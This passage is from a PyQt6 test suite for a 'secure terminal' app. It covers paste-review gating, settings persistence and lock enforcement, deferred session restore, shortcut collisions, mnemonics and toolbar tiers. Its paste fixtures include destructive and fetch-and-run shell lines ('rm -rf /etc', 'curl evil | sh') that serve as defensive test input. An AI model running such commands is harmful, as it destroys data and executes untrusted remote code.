# countdown elapses; a click during it is a gated no-op (the box already IS the preview).
_rbt.apply_paste_delay(3)
_rbm2 = _QMimeRB(); _rbm2.setText('rm -rf /etc\ncurl evil | sh\n'); _rbt.insertFromMimeData(_rbm2); pump()
ok(not _rbar._deliver.isEnabled() and _rbar._remaining > 0,
   'a paste with a delay leaves Deliver DISABLED during the countdown')
_rbar._deliver_clicked(); pump()
ok(_rbt.review_pending() and _rbar.isVisible(),
   'a deliver click during the countdown is a gated no-op (still reviewing)')
_rbar._reject.click(); pump()
_rbwin.close()

# REGRESSION: applying Global Settings must refresh an OPEN review's mirror -- the mirror
# mirrors the reviewed tab's theme/mode/font/zoom, and _apply_global just changed them on
# that tab. It used to leave the mirror stale until another per-tab setter ran.
_gmwin = MainWindow(); _gmwin.show(); pump()
if _gmwin.tabs.count() == 0:
    _gmwin.new_tab()
_gmt = _gmwin.current(); _gmt.apply_paste_warn('unicode'); pump()
_gm_calls = []
_gmwin._review_bar.rerender_mirror = lambda *a: _gm_calls.append(1)
_gmm = _QMimeRB(); _gmm.setText('rm -rf /\ncurl x\n'); _gmt.insertFromMimeData(_gmm); pump()
_gm_calls.clear()                                      # ignore the show_review render
_gmwin._apply_global({'theme': 'light', 'zoom': 100, 'mode': 'box', 'colors': True,
                      'line_edits': True, 'scrollback': 1000, 'paste_delay': 3,
                      'escape_limit': 4096, 'persist': False})
ok(bool(_gm_calls),
   'applying Global Settings refreshes an open review mirror (rerender_mirror called)')
_gmwin.close()

# --- app.aboutToQuit teardown: shuts every window's tabs, tolerating a raise ---
# main() connected _shutdown_all_tabs to app.aboutToQuit during the full-startup
# runs above; fire it with a tab whose shutdown() raises to drive the
# best-effort guard (the except that must never block quit).
_teardown_win = MainWindow()
_teardown_win.new_tab()


def _raise_shutdown():
    raise RuntimeError('shutdown blew up')


_teardown_win.tabs.widget(0).shutdown = _raise_shutdown
APP.aboutToQuit.emit()
ok(True, 'aboutToQuit teardown shuts down every tab and tolerates a failing shutdown')
_teardown_win.deleteLater()
APP.processEvents()

# global settings persist across restart (#68): _apply_global writes the defaults
# to the config so a fresh window reads them back.
import secure_terminal.settings as _ps                         # noqa: E402
_pcfg_prev = os.environ.get('XDG_CONFIG_HOME')
os.environ['XDG_CONFIG_HOME'] = tempfile.mkdtemp(prefix='st-persist-')
try:
    _pw = MainWindow()
    ok(_pw._tui_autobox_notice,
       'tui_autobox_notice loads default-on from a fresh (absent) config')
    _pw._apply_global({'theme': 'light', 'zoom': 175, 'mode': 'reveal', 'colors': True, 'line_edits': True,
                       'tui': False, 'osc': {}, 'osc_notice': False,
                       'tui_autobox_notice': False,
                       'scrollback': 7000, 'paste_delay': 5, 'escape_limit': 65536,
                       'persist': True})
    ok(not _pw._tui_autobox_notice and not _pw.act_tui_autobox_notice.isChecked(),
       '_apply_global stores tui_autobox_notice and mirrors it on the menu action')
    _pc = _ps.load()
    eq(_pc.get('theme'), 'light', 'settings persist: theme written to config')
    eq(_pc.get('zoom'), '175', 'settings persist: zoom written to config')
    eq(_pc.get('unicode_mode'), 'reveal', 'settings persist: unicode mode written')
    eq(_pc.get('scrollback'), '7000', 'settings persist: scrollback written')
    eq(_pc.get('paste_delay'), '5', 'settings persist: paste delay written')
    eq(_pc.get('escape_limit'), '65536', 'settings persist: escape limit written')
    eq(_pc.get('tui_autobox_notice'), 'false',
       'settings persist: tui_autobox_notice written to config')
    _pw.close()
    _pw.deleteLater()
finally:
    if _pcfg_prev is None:
        os.environ.pop('XDG_CONFIG_HOME', None)
    else:
        os.environ['XDG_CONFIG_HOME'] = _pcfg_prev

# deferred session restore (#59): the first tab is restored synchronously so the
# window opens with content; the rest render after the window is up (a big session
# no longer blocks the first paint), and closeEvent finishes any pending restore so
# no tab is dropped from the save.
import secure_terminal.session as _ds                         # noqa: E402
from PyQt6.QtCore import QEventLoop as _QEL59                  # noqa: E402
from PyQt6.QtGui import QCloseEvent as _QCE59                  # noqa: E402
_st_prev = os.environ.get('XDG_STATE_HOME')
_cfg_prev = os.environ.get('XDG_CONFIG_HOME')
os.environ['XDG_STATE_HOME'] = tempfile.mkdtemp(prefix='st-defer-')
# a fresh, empty config so persist_session defaults to True (a prior test may have
# written persist_session=false), otherwise the restore path is skipped entirely.
os.environ['XDG_CONFIG_HOME'] = tempfile.mkdtemp(prefix='st-defer-cfg-')
try:
    _ds.save([{'name': 'd0', 'text': 'zero\n', 'osc': {}},
              {'name': 'd1', 'text': 'one\n', 'osc': {}},
              {'name': 'd2', 'text': 'two\n', 'osc': {}}])
    from PyQt6.QtWidgets import QWidget as _QWidget99            # noqa: E402
    _dw = MainWindow()
    # #99: the WHOLE tab bar is drawn up front (all three entries at once), but only
    # the active tab has real content synchronously; the rest are placeholders that
    # swap in their real shell lazily -- so the bar never grows one tab at a time.
    eq(_dw.tabs.count(), 3,
       '#99: the whole tab bar is drawn up front (all entries present at once)')
    eq(len(_dw._real_terms()), 1,
       '#99: only the active tab has real content synchronously')
    eq(len(_dw._deferred_restore), 2,
       '#99: the remaining tabs are placeholders queued for a lazy swap')
    # #80: background tabs must not steal focus or switch the view -- a deferred
    # restore that switched to each tab flashed the view through all of them.
    _switches80 = []
    _dw.tabs.currentChanged.connect(lambda i: _switches80.append(i))
    for _ in range(40):
        _l = _QEL59()
        QTimer.singleShot(20, _l.quit)
        _l.exec()
        if not _dw._deferred_restore:
            break
    eq(_dw.tabs.count(), 3, 'deferred restore: all tabs restored after the window is up')
    eq(len(_dw._real_terms()), 3, '#99: every placeholder is swapped for a real tab')
    eq(_dw.tabs.currentIndex(), 0,
       '#80: the view stays on the first tab through the background restore')
    eq(_switches80, [],
       '#80: swapping in background tabs raises no tab-switch (no flashing)')
    ok(not _dw._deferred_restore, 'deferred restore: the queue drains')
    _dw._restore_next_deferred()      # a no-op once the queue is empty (early return)
    eq(_dw.tabs.count(), 3, 'deferred restore: a spurious drain call is a no-op')
    _dw._swap_placeholder(_QWidget99())   # #99: swap of an unknown placeholder -> no-op
    eq(_dw.tabs.count(), 3, '#99: swapping an unknown placeholder is a safe no-op')
    _dw.close()
    _dw.deleteLater()

    # #88/#92: the previously-focused tab is the one SHOWN immediately (never tab 0
    # first), and the others fill in AROUND it at their saved positions -- the active
    # widget stays visible throughout, so nothing flashes. Restore tab 2 as active.
    _ds.save([{'name': 'a0', 'text': 'a\n', 'osc': {}},
              {'name': 'a1', 'text': 'b\n', 'osc': {}},
              {'name': 'a2', 'text': 'c\n', 'osc': {}}], active=2)
    _aw = MainWindow()
    _active_w = _aw.current()                     # shown FIRST, before any deferred
    eq(_aw._user_titles.get(_active_w, ''), 'a2',
       '#92: the saved active tab is shown first, not tab 0')
    _shown = set()
    _aw.tabs.currentChanged.connect(lambda _i: _shown.add(_aw.current()))
    for _ in range(40):
        _l = _QEL59()
        QTimer.singleShot(20, _l.quit)
        _l.exec()
        if _aw.tabs.count() >= 3 and not _aw._deferred_restore:
            break
    eq([_aw._user_titles.get(_aw.tabs.widget(_i), '') for _i in range(3)],
       ['a0', 'a1', 'a2'], '#92: the restored tabs keep their saved order')
    eq(_aw.current(), _active_w, '#92: the active tab is still current after restore')
    ok(_shown <= {_active_w},
       '#92: only the active tab is ever shown -- no first-tab flash')
    _aw.close()
    _aw.deleteLater()
    # a saved active index that no longer fits the restored tabs is ignored (the
    # default first tab stays current). Craft it directly: save() drops an
    # out-of-range index, so write an inconsistent session to hit the guard.
    _ds._write_atomic(_ds.session_path(),
                      '{"tabs": [{"name": "b0", "osc": {}}], "active": 5}')
    _bw = MainWindow()
    eq(_bw.tabs.currentIndex(), 0, '#88: an active index past the restored tabs falls back to tab 0')
    _bw.deleteLater()
    # closeEvent must finish a still-pending restore so no tab is dropped from save
    _ds.save([{'name': 'e0', 'text': 'a\n', 'osc': {}},
              {'name': 'e1', 'text': 'b\n', 'osc': {}},
              {'name': 'e2', 'text': 'c\n', 'osc': {}}])
    _cw = MainWindow()
    eq(len(_cw._deferred_restore), 2, 'deferred restore: two tabs pending before close')
    _cw.closeEvent(_QCE59())
    ok(not _cw._deferred_restore and _cw.tabs.count() == 3,
       'closeEvent finishes the deferred restore before saving (no tab dropped)')
    _cw.deleteLater()

    # #99 (ai-review): a placeholder is labelled like its real tab (saved name, else
    # the saved cwd basename, else "shell") and is safe to select and to close before
    # its shell swaps in -- neither must call a SecureTerminal method on the QWidget.
    _ds.save([{'name': 'i0', 'text': 'x\n', 'osc': {}},          # active, restored real
              {'name': 'named', 'text': 'y\n', 'osc': {}},       # placeholder: user name
              {'name': '', 'cwd': '/usr/share', 'text': 'z\n', 'osc': {}},  # cwd basename
              {'name': '', 'text': 'w\n', 'osc': {}}], active=0)          # -> 'shell'
    _iw = MainWindow()
    eq(_iw.tabs.count(), 4, '#99: the full bar is drawn up front')
    eq(len(_iw._deferred_restore), 3, '#99: three placeholders pending')
    eq(_iw.tabs.tabText(1), 'named', '#99: a placeholder shows the saved name')
    eq(_iw.tabs.tabText(2), 'share',
       '#99: an unnamed placeholder shows its saved cwd basename')
    eq(_iw.tabs.tabText(3), 'shell',
       '#99: an unnamed placeholder with no saved cwd shows shell')
    ok(_iw.tabs.isTabEnabled(0) and not _iw.tabs.isTabEnabled(1)
       and not _iw.tabs.isTabEnabled(2) and not _iw.tabs.isTabEnabled(3),
       '#99 (F1): the active tab is enabled, placeholders are disabled (unselectable)')
    # a bulk "apply to all tabs" must skip placeholders, not call a setter on a QWidget
    _iw._apply_global({'theme': 'dark', 'zoom': 100, 'mode': 'box', 'colors': True, 'line_edits': True,
                       'tui': False, 'osc_notice': True, 'tui_autobox_notice': True, 'osc': {},
                       'scrollback': 1000, 'paste_delay': 0, 'escape_limit': 4096,
                       'persist': True})
    ok(_iw.current().current_theme() == 'dark',
       '#99 (F1): apply-to-all updates real tabs and skips placeholders (no crash)')
    # an all-tabs find hop must skip placeholders too (query absent from the real tab
    # forces the hop loop over the placeholder tabs)
    _iw._find_bar.input.setText('zqxjnomatch')
    _iw._find_bar.all_tabs.setChecked(True)
    _iw._find_step(False)
    ok(True, '#99 (F1): an all-tabs find skips placeholders without crashing')
    _iw.tabs.setCurrentIndex(2)                  # select a placeholder
    _iw._update_terminate_enabled()              # the 400ms poll path on a placeholder
    ok(not _iw.act_terminate.isEnabled(),
       '#99: selecting a placeholder disables Terminate and does not crash')
    _ph_close = _iw.tabs.widget(3)
    _iw.close_tab(3)                             # close a placeholder
    ok(_ph_close not in _iw._deferred_restore and _ph_close not in _iw._pending_restore
       and _iw.tabs.count() == 3,
       '#99: closing a placeholder drops it cleanly (no confirm, no shutdown)')
    _iw.close()
    _iw.deleteLater()

    # #99 (F7): closing the LAST tab when it is a placeholder must close the window --
    # the placeholder branch has to run the count==0 -> self.close() step too.
    _ds.save([{'name': 'l0', 'text': 'a\n', 'osc': {}},
              {'name': 'l1', 'text': 'b\n', 'osc': {}}], active=0)
    _lw = MainWindow()
    eq(_lw.tabs.count(), 2, '#99 (F7): a real active tab plus one placeholder')
    _lw.close_tab(0)                             # close the real active tab
    eq(_lw.tabs.count(), 1, '#99 (F7): one placeholder remains')
    _lw.close_tab(0)                             # close the last remaining placeholder
    ok(_lw.tabs.count() == 0,
       '#99 (F7): closing the last placeholder empties the window')
    _lw.deleteLater()

    # window geometry (size + maximized) persists across restart -- #77
    from PyQt6.QtWidgets import QApplication as _QApp77          # noqa: E402
    _ds.clear()
    _gw = MainWindow()
    _gw.resize(724, 468)
    _QApp77.processEvents()
    _ds.save(_gw._session_tabs(), _gw._window_state())
    ok(_ds.load_window() is not None, '#77: window geometry is saved with the session')
    _gw.deleteLater()
    _gw2 = MainWindow()                       # __init__ restores the saved geometry
    _QApp77.processEvents()
    ok(abs(_gw2.size().width() - 724) <= 8 and abs(_gw2.size().height() - 468) <= 8,
       '#77: a fresh window reopens at the saved size')
    _gw2.showMaximized()
    _QApp77.processEvents()
    _ds.save(_gw2._session_tabs(), _gw2._window_state())
    _gw2.deleteLater()
    _gw3 = MainWindow()
    _gw3.show()
    _QApp77.processEvents()
    ok(_gw3.isMaximized(), '#77: a maximized window reopens maximized')
    _gw3.deleteLater()
    # persist_session off -> geometry restore is skipped (covers the guard)
    _gw3b = MainWindow()
    _gw3b.show()
    _QApp77.processEvents()
    _gw3b._persist_session = False
    _geo77 = _gw3b.geometry()
    _gw3b._restore_window_geometry()          # persist off -> the guard returns early
    ok(_gw3b.geometry() == _geo77,
       '#77: geometry restore is a no-op when persistence is off (geometry unchanged)')
    _gw3b.deleteLater()

    # #78: a restored tab renders its scrollback ONCE in the saved mode -- no
    # re-render churn (which flickered the mode detail->show->box and jumped the
    # scrollbar). Spy on _rerender across the restore.
    from secure_terminal.terminal import SecureTerminal as _ST78    # noqa: E402
    _rr_orig = _ST78._rerender
    _rr = {'n': 0}
    def _rr_spy(self):                                              # noqa: E306
        _rr['n'] += 1
        return _rr_orig(self)
    _ST78._rerender = _rr_spy
    try:
        _mw78 = MainWindow()
        _rr['n'] = 0
        _mw78._restore_tab({'text': 'cafe box\n', 'mode': 'box', 'colors': True, 'line_edits': True,
                            'markings': False, 'osc': {}})
        _t78 = _mw78.current()
        eq(_t78.current_mode(), 'box', '#78: restored tab keeps its saved mode')
        ok(_t78.colors_enabled() and not _t78.markings_enabled(),
           '#78: restored tab keeps its saved colours/markings')
        eq(_rr['n'], 0,
           '#78: restore does not re-render (scrollback drawn once in final mode)')
        _mw78.deleteLater()
    finally:
        _ST78._rerender = _rr_orig
finally:
    for _var, _prev in (('XDG_STATE_HOME', _st_prev), ('XDG_CONFIG_HOME', _cfg_prev)):
        if _prev is None:
            os.environ.pop(_var, None)
        else:
            os.environ[_var] = _prev

# --- CLASH: shortcuts -- registry completeness, collisions, forwarded keys -----
# Ground truth is the LIVE QAction set, not win._shortcuts: taking the registry as
# truth is exactly what hid Alt+1..9, which were bound with a bare setShortcut and
# so were absent from the Shortcuts dialog AND from the duplicate check.
from PyQt6.QtCore import Qt as _Qt_sc                        # noqa: E402
from PyQt6.QtGui import QAction as _QAction_sc               # noqa: E402
from PyQt6.QtGui import QKeySequence as _QKS                 # noqa: E402

# Only actions reachable from the menubar: findChildren() also returns actions a
# rebuilt menu left behind as orphaned children, which are not user-reachable and
# would report as unregistered without meaning anything.
_menu_acts = []
for _m in win.menuBar().findChildren(QMenu):
    _menu_acts.extend(_m.actions())
_acts_with_keys = [a for a in dict.fromkeys(_menu_acts)
                   if not a.shortcut().isEmpty()]
ok(len(_acts_with_keys) >= 20,
   'actions carrying a shortcut were enumerated (%d)' % len(_acts_with_keys))

# Every shortcut-carrying action must be in the registry, or it is unlistable and
# uncheckable. Compared by QAction identity, so a label change cannot mask it.
_registered = {entry[0] for entry in win._shortcuts.values()}
_unregistered = sorted(a.text().replace('&', '') for a in _acts_with_keys
                       if a not in _registered)
eq(_unregistered, [],
   'every action with a shortcut is registered (listable and collision-checked)')

# No two registered actions may hold the same key.
_by_seq: dict[str, list[str]] = {}
for _ident, _entry in win._shortcuts.items():
    _norm = _entry[0].shortcut().toString()
    if _norm:
        _by_seq.setdefault(_norm, []).append(_ident)
eq(sorted(k for k, v in _by_seq.items() if len(v) > 1), [],
   'no key combination is assigned to two actions')

# No default may shadow a BARE key the terminal forwards to the running program:
# QAction processing fires first, so the key never reaches the program. This is
# what put fullscreen on F11 and shortcuts_help on F1 while _build_tui_keys mapped
# F11 -> ESC[23~ and F1 -> ESC OP, so vim and htop never received either.
# Scoped to the forwarding tables deliberately: a bare Ctrl+<letter> default
# (quit = Ctrl+Q) is a SEPARATE, deliberate decision -- _set_shortcuts documents
# that a built-in default is allowed to stand and only a user REBIND is refused.
from secure_terminal.main import _forwarded_keys as _fwd_keys      # noqa: E402

_shadowing = []
for _i, _ent in win._shortcuts.items():
    if not _ent[1]:
        continue
    _qks = _QKS(_ent[1])
    if _qks.isEmpty():
        continue
    _qkcombo = _qks[0]
    if (_qkcombo.keyboardModifiers() == _Qt_sc.KeyboardModifier.NoModifier
            and _qkcombo.key() in _fwd_keys()):
        _shadowing.append('%s=%s' % (_i, _ent[1]))
eq(sorted(_shadowing), [],
   'no shortcut default shadows a bare key the terminal forwards')

# ...and the reserved set must really come from the forwarding tables, not a
# hand-written list: every bare forwarded key must be reported reserved.
from secure_terminal.terminal import _build_tui_keys as _btk    # noqa: E402

_not_reserved = []
for _qtkey in _btk():
    if _qtkey in (_Qt_sc.Key.Key_Return, _Qt_sc.Key.Key_Enter,
                  _Qt_sc.Key.Key_Tab, _Qt_sc.Key.Key_Escape,
                  _Qt_sc.Key.Key_Backspace):
        continue          # Qt does not express these as a bare window shortcut
    if not win._is_reserved_shortcut(_QKS(_qtkey)):
        _not_reserved.append(int(_qtkey))
eq(_not_reserved, [],
   'every bare key the terminal forwards is treated as reserved')

# The collision check must consider the LIVE registry, not only the submitted
# mapping: a one-key change that lands on another action's key is a collision.
_sc_prev = dict(win._keybindings)
try:
    _copy_seq = win._shortcuts['copy'][0].shortcut().toString()
    _problems = win._set_shortcuts({'find': _copy_seq})
    ok(bool(_problems),
       'assigning one action the key another already holds is reported')
finally:
    win._keybindings = _sc_prev

# --- CLASH: lock= must hold on EVERY dialog-settable key ----------------------
# An administrator `lock=<key>` is a security control, and it was enforced per
# key by hand: _apply_global had a six-entry lock list while assigning fourteen
# attributes, so a locked paste_warn/copy_warn (and others) was overridable from
# the global Settings dialog even though the View-menu setter correctly refused.
# Drive the table instead of a hand-written list, so a new key cannot escape.
_gk = MainWindow._GLOBAL_KEYS
ok(len(_gk) >= 14, 'the dialog-settable key table was found (%d keys)' % len(_gk))

# Every key in the table must actually be persisted -- otherwise it is not a
# setting and the lock question is meaningless.
import ast as _ast_lk                                      # noqa: E402
import inspect as _in_lk                                   # noqa: E402

_persist_src = _in_lk.getsource(MainWindow._persist)
_persist_keys = set()
for _n in _ast_lk.walk(_ast_lk.parse(_persist_src.lstrip())):
    if isinstance(_n, _ast_lk.Dict):
        for _k in _n.keys:
            if isinstance(_k, _ast_lk.Constant) and isinstance(_k.value, str):
                _persist_keys.add(_k.value)
ok(len(_persist_keys) >= 20,
   'the _persist() key set was extracted (%d keys)' % len(_persist_keys))
eq(sorted({_k for _k, _f, _a in _gk} - _persist_keys), [],
   'every dialog-settable key is actually persisted')

# The load-bearing assertion: lock a key, hand _apply_global a DIFFERENT value,
# and require the attribute not to move. Derived from the table, so this covers
# a newly added key automatically.
_lk_prev = win._locked
_lk_bad = []
try:
    for _key, _field, _attr in _gk:
        _before = getattr(win, _attr)
        # A value guaranteed to differ from the current one, per type.
        if isinstance(_before, bool):
            _other = not _before
        elif isinstance(_before, int):
            _other = int(_before) + 7
        elif _key == 'unicode_mode':
            _other = 'reveal' if _before != 'reveal' else 'box'
        elif _key in ('paste_warn', 'copy_warn'):
            _other = 'always' if _before != 'always' else 'never'
        elif _key == 'theme':
            _other = 'light' if _before != 'light' else 'dark'
        else:
            _other = str(_before) + 'X'
        win._locked = {_key}
        _opts = {'theme': win._default_theme, 'zoom': win._default_zoom,
                 'mode': win._default_mode, 'colors': win._default_colors,
                 'line_edits': win._default_line_edits, 'tui': win._default_tui,
                 'scrollback': win._scrollback, 'paste_delay': win._paste_delay,
                 'escape_limit': win._escape_limit,
                 'persist': win._persist_session, 'systray': win._systray,
                 'auto_tab_colors': win._auto_tab_colors}
        _opts[_field] = _other
        win._apply_global(dict(_opts))
        _after = getattr(win, _attr)
        if _after != _before:
            _lk_bad.append((_key, _before, _other, _after))
finally:
    win._locked = _lk_prev
eq(_lk_bad, [],
   'a locked key is not overridable through the global settings dialog')

# --- every lock guard actually returns early ----------------------------------
# The guards added with the _GLOBAL_KEYS work refuse a locked change in the
# SETTER, which _apply_global never reaches -- so drive each setter directly with
# its key locked and require the value not to move.
_lk2_prev = win._locked
_setter_bad = []
try:
    for _key, _call, _read in (
            ('zoom', lambda: win.set_zoom(win._default_zoom + 13),
             lambda: win._default_zoom),
            ('theme', lambda: win.set_theme(
                'light' if win._default_theme != 'light' else 'dark'),
             lambda: win._default_theme),
            ('scrollback', lambda: win.set_scrollback(win._scrollback + 500),
             lambda: win._scrollback),
            ('paste_delay', lambda: win.set_paste_delay(win._paste_delay + 3),
             lambda: win._paste_delay),
            ('escape_limit', lambda: win.set_escape_limit(win._escape_limit + 512),
             lambda: win._escape_limit),
            ('persist_session', lambda: win.set_persist_session(
                not win._persist_session),
             lambda: win._persist_session),
            ('confirm_close', lambda: win.set_confirm_close(
                not win._confirm_close),
             lambda: win._confirm_close)):
        win._locked = {_key}
        _before2 = _read()
        _call()
        if _read() != _before2:
            _setter_bad.append(_key)
    # osc_notice_off is a set, so compare a copy
    win._locked = {'osc_notice_off'}
    _before_off = set(win._osc_notice_off)
    win.set_osc_notice_type('osc_title', False)
    if set(win._osc_notice_off) != _before_off:
        _setter_bad.append('osc_notice_off')
finally:
    win._locked = _lk2_prev
eq(_setter_bad, [], 'every lock-guarded setter refuses a locked change')

# _apply_locks must disable the zoom SPIN BOX, which is not a QAction and so is
# gated separately from the action list.
_lk3_prev = win._locked
try:
    win._locked = {'zoom'}
    win._apply_locks()
    ok(not win.zoom_box.isEnabled(),
       'a locked zoom disables the zoom spin box')
finally:
    win._locked = _lk3_prev
    win.zoom_box.setEnabled(True)

# Ctrl+PageUp / Ctrl+PageDown are consumed by the widget for tab switching, so a
# window shortcut there would never fire and must be reported reserved.
# Built from the Qt.Key ENUM, not a hand-typed name: Qt spells these "PgUp" /
# "PgDown", and QKeySequence('Ctrl+PageUp') silently parses to Key_unknown -- a
# test written that way passes or fails for the wrong reason.
_pgup = _QKS(_Qt_sc.KeyboardModifier.ControlModifier | _Qt_sc.Key.Key_PageUp)
_pgdn = _QKS(_Qt_sc.KeyboardModifier.ControlModifier | _Qt_sc.Key.Key_PageDown)
_pgup_shift = _QKS(_Qt_sc.KeyboardModifier.ControlModifier
                   | _Qt_sc.KeyboardModifier.ShiftModifier
                   | _Qt_sc.Key.Key_PageUp)
ok(win._is_reserved_shortcut(_pgup) and win._is_reserved_shortcut(_pgdn)
   and win._is_reserved_shortcut(_pgup_shift),
   'the tab-switch keys are reserved for the widget')

# --- CLASH: menu accelerators ------------------------------------------------
# The '&' in an action's text is a MNEMONIC marker, so two items in one menu
# marking the same letter make one of them unreachable by keyboard, and a literal
# ampersand must be written '&&' or Qt eats it (the item then reads "Folders
# Files..."). Both are silent: the menu still opens and every action still works.
# Derive from the live menubar rather than a list of expected labels.
import re as _re_mn                                       # noqa: E402

_mn_dupes = []
_mn_literal = []
for _menu in win.menuBar().findChildren(QMenu):
    _seen_keys: dict[str, str] = {}
    for _act in _menu.actions():
        _text = _act.text()
        if not _text:
            continue                                      # separator
        # A bare '&' that is neither '&&' nor a mnemonic marker on an alphanumeric
        # is a swallowed literal ampersand.
        for _m in _re_mn.finditer(r'&+', _text):
            _run = _m.group(0)
            if len(_run) % 2 == 0:
                continue                                  # '&&' pairs are literals
            _after = _text[_m.end():_m.end() + 1]
            if not _after.isalnum():
                _mn_literal.append((_menu.title(), _text))
        for _letter in _re_mn.findall(r'(?<!&)&(\w)', _text):
            _key = _letter.lower()
            if _key in _seen_keys:
                _mn_dupes.append((_menu.title(), _key,
                                  _seen_keys[_key], _text))
            else:
                _seen_keys[_key] = _text
ok(len(list(win.menuBar().findChildren(QMenu))) >= 4,
   'the menubar was enumerated (%d menus)'
   % len(list(win.menuBar().findChildren(QMenu))))
eq(_mn_literal, [],
   'no menu item swallows a literal ampersand (write it as "&&")')
eq(_mn_dupes, [], 'no two items in one menu claim the same mnemonic letter')

# --- responsive toolbar: no ">>" overflow at narrow widths -------------------
# At the old fixed 820px default (and any window narrower than the full-label
# layout) Qt folded the trailing chips + zoom behind a ">>" chevron, unreachable
# without the overflow menu. The toolbar now steps through three display tiers so
# every control stays on the bar with labels as informative as the width allows:
#   full    -- text-beside-icon action buttons + chip captions
#   labeled -- icon-only action buttons + chip captions (the app's 860 default)
#   icons   -- icon-only action buttons, chip captions hidden (narrowest)
# Driven WITHOUT show(): an offscreen second MainWindow shown under the coverage
# tracer perturbs Qt teardown (see the module header). resizeEvent + an explicit
# layout activation exercises the same relayout path deterministically. isHidden()
# (the explicit hide flag), not isVisible() (false while the window is unshown),
# is what tells captions apart here.
from PyQt6.QtCore import Qt as _QtTB, QSize as _QSzTB             # noqa: E402
from PyQt6.QtGui import QResizeEvent as _QRETB                    # noqa: E402
_tw = MainWindow()
_tb = _tw._toolbar
_caps = _tw._compact_hide
ok(len(_caps) == 3, 'toolbar: the three chip captions are hideable')
# tiers are ordered richest-first and every one has a measured width.
_tier_names = [t[0] for t in _tw._toolbar_tiers]
eq(_tier_names, ['full', 'labeled', 'icons'], 'toolbar: three tiers, richest first')
ok(all(w > 0 for _n, w in _tw._toolbar_tiers), 'toolbar: every tier has a width')
_need = dict(_tw._toolbar_tiers)
ok(_need['full'] > _need['labeled'] > _need['icons'],
   'toolbar: richer tiers need more width')

# a resizeEvent dispatched while the toolbar does not yet exist (early in
# construction) must be a safe no-op, not an AttributeError.
_saved_tb = _tw._toolbar
_tw._toolbar = None
_tw.resizeEvent(_QRETB(_QSzTB(800, 520), _QSzTB(800, 520)))
ok(_tw._toolbar is None, 'toolbar: a resize before the toolbar exists is a no-op')
_tw._toolbar = _saved_tb


def _tb_resize(width):
    _tw.resize(width, 520)
    _tw.resizeEvent(_QRETB(_QSzTB(width, 520), _QSzTB(width, 520)))
    _tb.layout().activate()          # recompute sizeHint for the new mode, unshown
    _tb.updateGeometry()
    APP.processEvents()


# wide window: full text-beside-icon labels, captions shown, whole bar fits.
_tb_resize(1500)
eq(_tw._toolbar_tier, 'full', 'toolbar: a wide window shows the full labels')
eq(_tb.toolButtonStyle(), _QtTB.ToolButtonStyle.ToolButtonTextBesideIcon,
   'toolbar: a wide window uses text-beside-icon buttons')
ok(not any(c.isHidden() for c in _caps),
   'toolbar: a wide window shows the chip captions')
ok(_tb.sizeHint().width() <= _tw.width(),
   'toolbar: the full toolbar fits a wide window without the >> overflow')

# the app's default width: the "labeled" middle tier -- icon-only action buttons
# but the chip captions still shown (the clean, self-documenting narrow view).
_tb_resize(M.TOOLBAR_DEFAULT_WIDTH)
eq(_tw._toolbar_tier, 'labeled', 'toolbar: the default width uses the labeled tier')
eq(_tb.toolButtonStyle(), _QtTB.ToolButtonStyle.ToolButtonIconOnly,
   'toolbar: the labeled tier uses icon-only buttons')
ok(not any(c.isHidden() for c in _caps),
   'toolbar: the labeled tier keeps the chip captions')
ok(_tb.sizeHint().width() <= _tw.width(),
   'toolbar: the labeled tier fits the default width without the >> overflow')

# narrower still: the leanest "icons" tier -- captions hidden so the bar fits.
_tb_resize(_need['labeled'] - 1)
eq(_tw._toolbar_tier, 'icons', 'toolbar: a narrow window drops to the icons tier')
eq(_tb.toolButtonStyle(), _QtTB.ToolButtonStyle.ToolButtonIconOnly,
   'toolbar: the icons tier uses icon-only buttons')
ok(all(c.isHidden() for c in _caps), 'toolbar: the icons tier hides the chip captions')
ok(_tb.sizeHint().width() <= _tw.width(),
   'toolbar: the icons tier fits a narrow window without the >> overflow')
# icon-only is only safe if every button actually has an icon (the fallbacks
# guarantee one even with no desktop icon theme, as in this offscreen run).
ok(all(not a.icon().isNull() for a in
       (_tw.act_new, _tw.act_copy, _tw.act_paste, _tw.act_terminate)),
   'toolbar: every icon-only button has a non-null icon')

# widening again restores the full labels (covers the icons -> full path, which
# steps up through more than one tier in a single relayout).
_tb_resize(1500)
eq(_tw._toolbar_tier, 'full', 'toolbar: re-widening restores the full labels')

# hysteresis: a width just inside a tier's slack band, reached from a leaner tier,
# does NOT step up yet (so the switch cannot oscillate at the boundary).
_tb_resize(_need['labeled'] - 1)               # settle in the icons tier
eq(_tw._toolbar_tier, 'icons', 'toolbar: hysteresis setup lands in icons')
_tb_resize(_need['labeled'] + M.TOOLBAR_COMPACT_SLACK - 1)
eq(_tw._toolbar_tier, 'icons',
   'toolbar: a step up inside the slack band is held off (hysteresis)')
_tb_resize(_need['labeled'] + M.TOOLBAR_COMPACT_SLACK)
eq(_tw._toolbar_tier, 'labeled',
   'toolbar: past the slack band it steps up to the labeled tier')

# The tier thresholds must cover the WORST case -- the TUI indicator (the yellow
# dot, shown only while TUI is active) visible -- so an active-TUI tab near a
# boundary does not overflow: the dot widens the layout, and a threshold cached
# without it would keep a richer tier a few px too long.
_dot_prev = _tw.tui_dot_action.isVisible()
_tw.tui_dot_action.setVisible(True)
_tb.layout().activate()
APP.processEvents()
ok(_tw._toolbar_full_width >= _tb.sizeHint().width(),
   'toolbar: the tier threshold covers the TUI-indicator width')
_tw.tui_dot_action.setVisible(_dot_prev)
_tb.layout().activate()
APP.processEvents()

_tw.deleteLater()
APP.processEvents()


# --- container theming + render-active sweep (perf cycle) ---------------------
from secure_terminal.main import MainWindow as _p37MW
from secure_terminal.terminal import SecureTerminal as _p37ST
from secure_terminal.sanitize import THEMES as _p37TH
_p37w = _p37MW()
_p37w.new_tab(); APP.processEvents()
_p37act = _p37w.current().current_theme()
ok(_p37TH[_p37act][0] in _p37w.tabs.styleSheet() and 'QStackedWidget' in _p37w.tabs.styleSheet(),
   'theming: the container stylesheet carries the active theme bg')
_p37other = 'light' if _p37act != 'light' else 'dark'
_p37w.set_theme(_p37other); APP.processEvents()
ok(_p37TH[_p37other][0] in _p37w.tabs.styleSheet(), 'theming: the container follows a theme change')
_p37w.new_tab(); APP.processEvents()
_p37terms = [_p37w.tabs.widget(_p37i) for _p37i in range(_p37w.tabs.count())
             if isinstance(_p37w.tabs.widget(_p37i), _p37ST)]
ok(len(_p37terms) >= 2, 'sweep: >=2 real terminal tabs')
_p37cur = _p37w.tabs.currentWidget()
ok(_p37cur._render_active is True, 'sweep: the current tab is render-active')
